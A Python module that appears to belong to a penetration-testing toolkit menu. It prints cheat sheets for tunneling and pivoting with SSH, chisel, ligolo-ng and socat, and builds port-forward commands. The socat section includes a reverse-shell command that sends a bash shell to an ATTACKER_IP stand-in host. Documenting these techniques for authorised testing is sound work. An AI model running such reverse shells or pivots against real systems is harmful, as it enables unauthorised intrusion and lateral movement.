# tunneling and pivoting
import os, subprocess, socket
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box

console = Console()

def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def runcmd(cmd, t=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return p.stdout + p.stderr
    except:
        return "[!] failed"

def pause():
    Prompt.ask("\n[dim]enter to continue[/dim]")


def ssh_tunnels():
    clr()
    console.print("[bold red]=== SSH TUNNELS ===[/bold red]\n")
    
    console.print("[bold yellow]--- Local Port Forward ---[/bold yellow]")
    console.print("  forward remote port to your local port")
    console.print("  [cyan]ssh -L 8080:internal-host:80 user@jumpbox[/cyan]")
    console.print("  now visit localhost:8080 -> internal-host:80\n")
    
    console.print("[bold yellow]--- Remote Port Forward ---[/bold yellow]")
    console.print("  expose your local port on remote")
    console.print("  [cyan]ssh -R 8080:localhost:3000 user@target[/cyan]")
    console.print("  target can now visit their localhost:8080\n")
    
    console.print("[bold yellow]--- Dynamic (SOCKS Proxy) ---[/bold yellow]")
    console.print("  create a SOCKS proxy through the tunnel")
    console.print("  [cyan]ssh -D 1080 user@target[/cyan]")
    console.print("  then use proxychains:")
    console.print("  [cyan]proxychains nmap -sT 10.10.10.0/24[/cyan]\n")
    
    console.print("[bold yellow]--- SSH Jump Host (-J) ---[/bold yellow]")
    console.print("  chain through multiple hosts")
    console.print("  [cyan]ssh -J user@jump1 user@internal[/cyan]")
    console.print("  multi-hop:")
    console.print("  [cyan]ssh -J user@hop1,user@hop2 user@final[/cyan]\n")
    
    console.print("[bold yellow]--- ProxyChains Config ---[/bold yellow]")
    console.print("  edit /etc/proxychains4.conf:")
    console.print("  [cyan]socks5 127.0.0.1 1080[/cyan]\n")
    
    pause()

def chisel():
    clr()
    console.print("[bold red]=== CHISEL TUNNELING ===[/bold red]\n")
    console.print("[dim]chisel is a fast TCP/UDP tunnel tool[/dim]\n")
    
    console.print("[bold yellow]--- Setup ---[/bold yellow]")
    console.print("  download: https://github.com/jpillora/chisel/releases\n")
    
    console.print("[bold yellow]--- Server (on your machine) ---[/bold yellow]")
    console.print("  [cyan]chisel server --reverse --port 8000[/cyan]\n")
    
    console.print("[bold yellow]--- Client (on target) ---[/bold yellow]")
    console.print("  reverse SOCKS proxy:")
    console.print("  [cyan]chisel client YOUR_IP:8000 R:socks[/cyan]\n")
    console.print("  forward specific port:")
    console.print("  [cyan]chisel client YOUR_IP:8000 R:3389:localhost:3389[/cyan]\n")
    console.print("  reverse port forward:")
    console.print("  [cyan]chisel client YOUR_IP:8000 R:8080:localhost:80[/cyan]\n")
    
    console.print("[bold yellow]--- Usage ---[/bold yellow]")
    console.print("  after connecting, use proxychains:")
    console.print("  [cyan]proxychains nmap -sT -p 445,3389,22 internal_host[/cyan]\n")
    
    pause()

def ligolo():
    clr()
    console.print("[bold red]=== LIGOLO-NG TUNNELING ===[/bold red]\n")
    console.print("[dim]ligolo-ng creates tunnels through reverse connections[/dim]\n")
    
    console.print("[bold yellow]--- Server (attacker) ---[/bold yellow]")
    console.print("  [cyan]sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601[/cyan]\n")
    
    console.print("[bold yellow]--- Agent (target) ---[/bold yellow]")
    console.print("  [cyan]./ligolo-agent -connect YOUR_IP:11601 -ignore-cert[/cyan]\n")
    
    console.print("[bold yellow]--- In the proxy console ---[/bold yellow]")
    console.print("  [cyan]session[/cyan]          - list agents")
    console.print("  [cyan]session <id>[/cyan]     - select agent")
    console.print("  [cyan]ifconfig[/cyan]        - show agent interfaces")
    console.print("  [cyan]start[/cyan]           - start tunnel")
    console.print("  [cyan]addroute 10.10.10.0/24[/cyan] - add route\n")
    
    console.print("[bold yellow]--- Setup Routes ---[/bold yellow]")
    console.print("  add route to internal network:")
    console.print("  [cyan]sudo ip route add 10.10.10.0/24 dev ligolo[/cyan]\n")
    console.print("  then use proxychains or connect directly.\n")
    
    pause()

def socat_tunnel():
    clr()
    console.print("[bold red]=== SOCAT TUNNELING ===[/bold red]\n")
    
    console.print("[bold yellow]--- Simple Port Forward ---[/bold yellow]")
    console.print("  forward local 8080 to remote 80:")
    console.print("  [cyan]socat TCP-LISTEN:8080,fork TCP:internal-host:80[/cyan]\n")
    
    console.print("[bold yellow]--- Reverse Shell Tunnel ---[/bold yellow]")
    console.print("  listener on attacker:")
    console.print("  [cyan]socat file:`tty`,raw,echo=0 tcp-listen:4444,reuseaddr[/cyan]")
    console.print("  on target:")
    console.print("  [cyan]socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444[/cyan]\n")
    
    console.print("[bold yellow]--- Encrypted Tunnel ---[/bold yellow]")
    console.print("  generate cert:")
    console.print("  [cyan]openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 30 -out cert.pem && cat key.pem cert.pem > merged.pem[/cyan]")
    console.print("  listener:")
    console.print("  [cyan]socat OPENSSL-LISTEN:4444,cert=merged.pem,verify=0 STDOUT[/cyan]")
    console.print("  client:")
    console.print("  [cyan]socat - OPENSSL:attacker:4444,verify=0[/cyan]\n")
    
    console.print("[bold yellow]--- UDP Forwarding ---[/yellow]")
    console.print("  [cyan]socat UDP-LISTEN:5353,fork UDP:target-dns:53[/cyan]\n")
    
    pause()

def portforward_build():
    clr()
    console.print("[bold red]=== PORT FORWARD BUILDER ===[/bold red]\n")
    
    lhost = Prompt.ask("[cyan]LHOST (where to listen)[/cyan]", default="0.0.0.0")
    lport = Prompt.ask("[cyan]LPORT (port to listen on)[/cyan]", default="8080")
    rhost = Prompt.ask("[cyan]RHOST (target to forward to)[/cyan]")
    rport = Prompt.ask("[cyan]RPORT (target port)[/cyan]")
    proto = Prompt.ask("[cyan]protocol[/cyan]", choices=["tcp", "udp"], default="tcp")
    
    console.print(f"\n[bold green]--- Commands ---[/bold green]\n")
    
    console.print("[yellow]socat:[/yellow]")
    if proto == "tcp":
        console.print(f"  [cyan]socat TCP-LISTEN:{lport},fork,reuseaddr TCP:{rhost}:{rport}[/cyan]\n")
    else:
        console.print(f"  [cyan]socat UDP-LISTEN:{lport},fork UDP:{rhost}:{rport}[/cyan]\n")
    
    console.print("[yellow]netcat:[/yellow]")
    console.print(f"  [cyan]while true; do nc -lvnp {lport} | nc {rhost} {rport}; done[/cyan]\n")
    
    console.print("[yellow]ssh (if you have access):[/yellow]")
    console.print(f"  [cyan]ssh -L {lport}:{rhost}:{rport} user@jumpbox[/cyan]\n")
    
    console.print("[yellow]iptables (linux):[/yellow]")
    console.print(f"  [cyan]iptables -t nat -A PREROUTING -p tcp --dport {lport} -j DNAT --to {rhost}:{rport}[/cyan]")
    console.print(f"  [cyan]iptables -t nat -A POSTROUTING -j MASQUERADE[/cyan]\n")
    
    pause()


def run():
    while True:
        clr()
        console.print("[bold red]=== TUNNELING & PIVOTING ===[/bold red]\n")
        from rich.table import Table
        t = Table(show_header=False, box=box.ROUNDED, border_style="red", padding=(0, 2))
        t.add_column("", style="bold yellow", width=4)
        t.add_column("")
        opts = [
            "SSH Tunnels",
            "Chisel Tunneling",
            "Ligolo-NG Tunneling",
            "Socat Tunneling",
            "Port Forward Builder",
        ]
        for i, o in enumerate(opts, 1):
            t.add_row(str(i), o)
        t.add_row("", "")
        t.add_row("b", "Back")
        console.print(Panel(t, title="[bold]TUNNELS & PIVOTS[/bold]", border_style="red"))
        
        try:
            c = int(Prompt.ask("[bold yellow]>[/bold yellow]"))
        except ValueError:
            c = 0
        
        if c == 1: ssh_tunnels()
        elif c == 2: chisel()
        elif c == 3: ligolo()
        elif c == 4: socat_tunnel()
        elif c == 5: portforward_build()
        elif c == 0: return
